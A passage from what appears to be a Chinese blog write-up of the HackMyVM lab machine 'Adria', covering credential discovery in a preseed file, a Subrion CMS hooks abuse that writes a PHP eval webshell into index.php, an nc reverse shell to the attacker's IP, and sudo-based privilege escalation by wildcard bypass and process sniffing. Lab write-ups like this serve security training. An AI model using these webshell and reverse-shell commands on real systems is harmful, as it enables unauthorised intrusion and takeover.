seed\u003c/code\u003e**中找到了一些有趣的东西\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 创建 admin 用户\n\u003cspan class=\"hljs-comment\"\u003e# Users\u003c/span\u003e\nd-i passwd/user-fullname string admin\nd-i passwd/username string admin\nd-i passwd/user-password password jojo1989\nd-i passwd/root-login boolean \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\nd-i passwd/root-password password jojo1989\nd-i user-setup/allow-password-weak boolean \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\n// 创建 Adam Lewis 用户\n\u003cspan class=\"hljs-comment\"\u003e# To create a normal user account.\u003c/span\u003e\nd-i passwd/user-fullname string Adam Lewis\nd-i passwd/username string alewis\n\u003cspan class=\"hljs-comment\"\u003e# Normal user's password, either in clear text\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#d-i passwd/user-password password insecure\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#d-i passwd/user-password-again password insecure\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# or encrypted using a crypt(3) hash.\u003c/span\u003e\nd-i passwd/user-password-crypted 158f5ddb69d03f91bb449ee170913268\n\u003cspan class=\"hljs-comment\"\u003e# Create the first user with the specified UID instead of the default.\u003c/span\u003e\nd-i passwd/user-uid string 1010\n\u003cspan class=\"hljs-comment\"\u003e# The installer will warn about weak passwords. If you are sure you know\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# what you're doing and want to override it, uncomment this.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#d-i user-setup/allow-password-weak boolean true\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003erockyou\u003c/code\u003e 爆破 \u003ccode\u003ealewis\u003c/code\u003e 用户的密码失败了\u003c/p\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e需要将 \u003ccode\u003eadria.hmv\u003c/code\u003e 写入 \u003ccode\u003ehosts\u003c/code\u003e ，是使用 \u003ccode\u003esubrion\u003c/code\u003e 搭建的（一个开源内容管理系统）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有注册功能，但是密码会被发送到邮箱，但是邮箱是收不到的。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试前面获得的账户 \u003ccode\u003eadmin:jojo1989\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击齿轮图标能进入后台，并且能看到版本是 \u003ccode\u003e4.2.1\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e搜索公开漏洞，该版本存在文件上传漏洞\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003eCVE-2018-19422\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e直接脚本梭哈：\u003ca href=\"https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE\"\u003ehttps://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我这里尝试修改了脚本，因为是成功登陆进去了的，但是也是在上传后无法进行访问，我这里手动上传也是一样\u003c/p\u003e\n\u003cp\u003e然后找到了另外一种利用方式：\u003ca href=\"https://github.com/intelliants/subrion/issues/909\"\u003ehttps://github.com/intelliants/subrion/issues/909\u003c/a\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看网站绝对路径  \u003ccode\u003e/var/www/html\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esystem\u003c/code\u003e 中选择 \u003ccode\u003ehooks\u003c/code\u003e 页\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在 \u003ccode\u003eHooks\u003c/code\u003e 中编辑 \u003ccode\u003esitemapGeneration\u003c/code\u003e 并保存，从上面的 \u003ccode\u003ePHPinfo\u003c/code\u003e 获取绝对路径\u003c/p\u003e\n\u003cp\u003e此时我们可以将 webshell 写入网站首页文件 \u003ccode\u003eindex.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efputs(fopen(\u003cspan class=\"hljs-string\"\u003e'/var/www/html/index.php'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'a+'\u003c/span\u003e),\u003cspan class=\"hljs-string\"\u003e'@eval($_GET[cmd]);'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esave\u003c/code\u003e 后点击 \u003ccode\u003eGeneral Sitemap\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e监听端口，进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Adria curl -G \u003cspan class=\"hljs-string\"\u003e\"http://adria.hmv/index.php\"\u003c/span\u003e --data-urlencode \u003cspan class=\"hljs-string\"\u003e\"cmd=system('nc -e /bin/bash 192.168.56.4 1234');\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权 - To Adriana\u003c/h2\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@adria:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e: unable to resolve host adria: Temporary failure \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e name resolution\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e www-data on adria:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser www-data may run the following commands on adria:\n    (adriana) NOPASSWD: /usr/bin/scalar\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e该命令无法提权，但是可以通过它的 \u003ccode\u003ehelp\u003c/code\u003e 进行提权，它的命令帮助是通过 \u003ccode\u003ehead\u003c/code\u003e 打开的，\u003ccode\u003ehead\u003c/code\u003e只需要输入 \u003ccode\u003e!/bin/bash\u003c/code\u003e 即可打开 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e写入公钥，然后就可以使用 \u003ccode\u003eSSH\u003c/code\u003e 进行登陆了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e╭─adriana@adria ~ \n╰─$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nfbd401c3bff5ec92d1ba6f74a2340f0f\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - To Root\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e╭─adriana@adria ~ \n╰─$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e: unable to resolve host adria: Temporary failure \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e name resolution\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e adriana on adria:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser adriana may run the following commands on adria:\n    (ALL : ALL) NOPASSWD: /opt/backup\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 \u003ccode\u003ebackup\u003c/code\u003e 是一个脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e╭─adriana@adria /opt \n╰─$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al backup \n-rwxr-xr-x 1 root root 294 Nov  6  2023 backup\n╭─adriana@adria /opt \n╰─$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e backup  \n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\n\nPASSWORD=$(/usr/bin/cat /root/pass)\n\n\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e -ep \u003cspan class=\"hljs-string\"\u003e\"Password: \"\u003c/span\u003e USER_PASS\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [[ \u003cspan class=\"hljs-variable\"\u003e$PASSWORD\u003c/span\u003e == \u003cspan class=\"hljs-variable\"\u003e$USER_PASS\u003c/span\u003e ]] ; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n\n  /usr/bin/echo \u003cspan class=\"hljs-string\"\u003e\"Authorized access\"\u003c/span\u003e\n  /usr/bin/sleep 1\n  /usr/bin/zip -r -e -P \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$PASSWORD\u003c/span\u003e\"\u003c/span\u003e /opt/backup.zip /var/www/html\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n  /usr/bin/echo \u003cspan class=\"hljs-string\"\u003e\"Access denied\"\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e 1\n\u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取用户输入的密码和\u003ccode\u003e/root/pass\u003c/code\u003e中的密码进行比对，正确的话会使用密码作为压缩密码压缩 \u003ccode\u003e/var/www/html\u003c/code\u003e 并保存为 \u003ccode\u003e/opt/backup.zip\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e其中的 \u003ccode\u003e$PASSWORD == $USER_PASS\u003c/code\u003e 应该为 \u003ccode\u003e\"$PASSWORD\"== \"$USER_PASS\"\u003c/code\u003e ，可以尝试使用通配符绕过\u003c/p\u003e\n\u003cp\u003e并且\u003ccode\u003ezip -P \"$PASSWORD\"\u003c/code\u003e会将密码明文传递到命令行参数，通过\u003ccode\u003eps -ef\u003c/code\u003e等命令可被其他用户捕获\u003c/p\u003e\n\u003cp\u003e首先上传 \u003ccode\u003epspy64\u003c/code\u003e 监听进程\u003c/p\u003e\n\u003cp\u003e然后执行 \u003ccode\u003esudo /opt/backup\u003c/code\u003e ，密码输入 \u003ccode\u003e*\u003c/code\u003e ，然后 \u003ccode\u003epspy64\u003c/code\u003e 中可以截取到密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAdria/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e8eNctPoCh4Potes5eVD7eMxUw6wRBmO\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e该密码就是 \u003ccode\u003eroot\u003c/code\u003e 的密码，读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e╭─root@adria ~ \n╰─# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \n3a61b172fd39402aa96b1653a18e38a1\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Adria","date":"2025-05-17","updated":"2025-05-17","tags":["HackMyVM","Linux靶机","subrion"],"categories":"靶机","comments":true,"description":"Adria. https://hackmyvm.eu/machines/machine.php?vm=Adria Notes：Enjoy! 前期踩点 SMB 我们能看到有SMB服务，尝试使用anonymous 用户去连接 在 DebianShare 中能下载一个压缩包 解压该压缩包 这些文件夹通常出..."},"recentPosts":[{"id":"TheHackersLabsLuna","title":"TheHackersLabs - Luna","date":"2025-10-28","isEncrypted":false,"year":"2025","month":"10","day":"28"},{"id":"TheHackersLabsTHLPWN","title":"TheHackersLabs - THLPWN","date":"2025-10-27","isEncrypted":false,"year":"2025","month":"10","day":"27"},{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine
